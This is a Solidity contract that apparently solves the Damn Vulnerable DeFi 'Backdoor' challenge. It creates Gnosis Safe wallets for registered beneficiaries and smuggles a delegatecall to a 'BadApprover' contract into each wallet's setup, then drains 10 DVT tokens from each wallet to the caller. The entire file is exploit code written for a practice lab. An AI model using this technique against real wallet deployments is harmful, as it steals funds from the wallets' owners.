// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "./BadApprover.sol";

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(address _singleton, bytes memory initializer, uint256 saltNonce, IProxyCreationCallback callback) external returns (GnosisSafeProxy proxy);
}

contract HackWalletRegistry {
    constructor(address _walletFactory, address _masterCopy, IProxyCreationCallback _callback, IERC20 token, address[4] memory beneficiaries) {
        // 1. Instantiate a false wallet contract to call during the smart wallet creation in order 
        // to approve this contract to steal 10 DVT tokens
        BadApprover badApprover = new BadApprover(address(this), token);
        // For each beneficiary
        for (uint i = 0; i < beneficiaries.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = beneficiaries[i];
            bytes memory dataWallet = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners, 
                1,
                address(badApprover),
                abi.encodeWithSelector(BadApprover.approveHacker.selector), // new bytes(0),
                address(0x0),
                address(0x0),
                0,
                address(0x0)
            );
            // 2. Create a GnosisSafe proxy that will call the registry and send token to the proxy
            // remember that in the first step the proxy approved this contract to move the funds
            GnosisSafeProxy proxy = IGnosisSafeProxyFactory(_walletFactory).createProxyWithCallback(_masterCopy, dataWallet, 0, _callback);
            // 3. Moove all the funds from the proxy to the player
            token.transferFrom(address(proxy), msg.sender, 10 ether);
        }
    }

}